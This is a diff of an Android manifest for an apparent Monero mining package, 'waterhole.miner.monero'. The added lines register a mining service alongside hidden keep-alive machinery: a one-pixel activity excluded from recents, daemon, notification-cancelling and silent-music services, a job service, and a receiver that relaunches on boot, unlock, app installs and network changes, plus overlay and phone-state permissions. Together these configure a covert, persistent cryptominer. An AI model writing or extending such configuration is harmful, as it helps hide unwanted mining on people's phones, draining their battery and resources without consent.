@@ -1,19 +1,85 @@
-<manifest package="waterhole.miner.monero"
-          xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+  package="waterhole.miner.monero">
 
-    <uses-permission android:name="android.permission.INTERNET"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+  <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+  <uses-permission android:name="android.permission.INTERNET" />
+  <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+  <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+  <uses-permission android:name="android.permission.WAKE_LOCK" />
 
-    <application
-        android:allowBackup="true"
-        android:label="@string/app_name"
-        android:theme="@style/AppTheme">
-        <service
-            android:name="waterhole.miner.monero.MineService"
-            android:enabled="true"
-            android:process=":waterhole"/>
+  <application
+    android:allowBackup="true"
+    android:label="@string/app_name"
+    android:theme="@style/AppTheme">
 
-        <service android:name=".TraceServiceImpl"/>
-    </application>
+    <activity
+      android:configChanges="keyboardHidden|orientation|screenSize|navigation|keyboard"
+      android:excludeFromRecents="true"
+      android:finishOnTaskLaunch="false"
+      android:launchMode="singleInstance"
+      android:name=".keepappalive.SinglePixelActivity"
+      android:theme="@style/SingleActivityStyle" />
+
+    <service
+      android:enabled="true"
+      android:name="waterhole.miner.monero.MineService"
+      android:process=":waterhole" />
+
+    <!--注册Service-->
+    <service
+      android:enabled="true"
+      android:exported="true"
+      android:name=".keepappalive.service.DaemonService"
+      android:process=":daemon_service" />
+
+    <service
+      android:enabled="true"
+      android:exported="true"
+      android:name=".keepappalive.service.CancelNoticeService"
+      android:process=":service" />
+
+    <service
+      android:enabled="true"
+      android:exported="true"
+      android:name=".keepappalive.service.PlayerMusicService"
+      android:process=":music_service" />
+
+    <service
+      android:name=".keepappalive.service.AliveJobService"
+      android:permission="android.permission.BIND_JOB_SERVICE" />
+
+    <!--接收系统广播接收器-->
+    <receiver android:name=".keepappalive.receiver.KeepAliveReceiver">
+      <!--设备重启广播-->
+      <intent-filter>
+        <action android:name="android.intent.action.BOOT_COMPLETED" />
+        <category android:name="android.intent.category.LAUNCHER" />
+      </intent-filter>
+      <!--安装或卸载广播-->
+      <intent-filter>
+        <action android:name="android.intent.action.PACKAGE_ADDED" />
+        <action android:name="android.intent.action.PACKAGE_REMOVED" />
+
+        <data android:scheme="package" />
+      </intent-filter>
+      <!--解锁广播-->
+      <intent-filter>
+        <action android:name="android.intent.action.ACTION_USER_PRESENT" />
+      </intent-filter>
+      <!--存储卡挂载广播-->
+      <intent-filter>
+        <action android:name="android.intent.action.MEDIA_MOUNTED" />
+        <action android:name="android.intent.action.MEDIA_UNMOUNTED" />
+
+        <data android:scheme="file"/>
+      </intent-filter>
+      <!--网络状态广播-->
+      <intent-filter>
+        <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+        <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+        <action android:name="android.net.wifi.STATE_CHANGE" />
+      </intent-filter>
+    </receiver>
+  </application>
 </manifest>
